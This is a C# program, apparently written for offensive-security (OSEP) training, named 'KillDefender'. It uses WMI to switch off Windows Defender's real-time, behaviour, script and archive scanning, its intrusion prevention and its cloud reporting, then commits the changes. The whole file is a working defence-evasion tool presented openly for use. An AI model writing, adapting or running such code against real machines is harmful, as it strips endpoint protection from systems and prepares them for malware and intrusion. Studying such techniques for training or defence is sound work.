using System;
using System.Management;

namespace OSEP
{
    public class KillDefender
    {
        public static void Main(string[] args)
        {
            Console.WriteLine("[*] OSEP Defender Disarmer (C# - WMI Edition)");

            try
            {
                ManagementScope scope = new ManagementScope(@"\\.\root\Microsoft\Windows\Defender");
                scope.Connect();

                ObjectQuery query = new ObjectQuery("SELECT * FROM MSFT_MpPreference");
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
                
                ManagementObject mpInstance = null;
                foreach (ManagementObject obj in searcher.Get())
                {
                    mpInstance = obj;
                    break;
                }

                if (mpInstance == null)
                {
                    Console.WriteLine("[-] ERROR: Could not find MSFT_MpPreference instance.");
                    return;
                }

                Console.WriteLine("[*] Disarming components (Atomic Mode)...");

                string[] properties = {
                    "DisableRealtimeMonitoring", "DisableBehaviorMonitoring", "DisableBlockAtFirstSeen",
                    "DisableIOAVProtection", "DisablePrivacyMode", "SignatureDisableUpdateOnStartupWithoutEngine",
                    "DisableArchiveScanning", "DisableIntrusionPreventionSystem", "DisableScriptScanning"
                };

                foreach (string prop in properties)
                {
                    try {
                        mpInstance[prop] = true;
                        Console.WriteLine("[+] Set {0} = True", prop);
                    } catch {
                        Console.WriteLine("[!] Property {0} not found or protected. Skipping.", prop);
                    }
                }

                // Handle byte-based properties
                try { mpInstance["SubmitSamplesConsent"] = (byte)2; Console.WriteLine("[+] Set SubmitSamplesConsent = 2"); } catch { }
                try { mpInstance["MAPSReporting"] = (byte)0; Console.WriteLine("[+] Set MAPSReporting = 0"); } catch { }

                Console.WriteLine("[*] Committing changes via WMI...");
                mpInstance.Put();

                Console.WriteLine("[+] SUCCESS: Protection settings updated.");
                Console.WriteLine("[!] Note: If settings remain 'False', Tamper Protection is active.");
            }
            catch (ManagementException e)
            {
                if ((uint)e.ErrorCode == 0x80041003)
                    Console.WriteLine("[-] ERROR: Access Denied. Admin required.");
                else
                    Console.WriteLine("[-] WMI ERROR: {0}", e.Message);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] ERROR: {0}", ex.Message);
            }
        }
    }
}
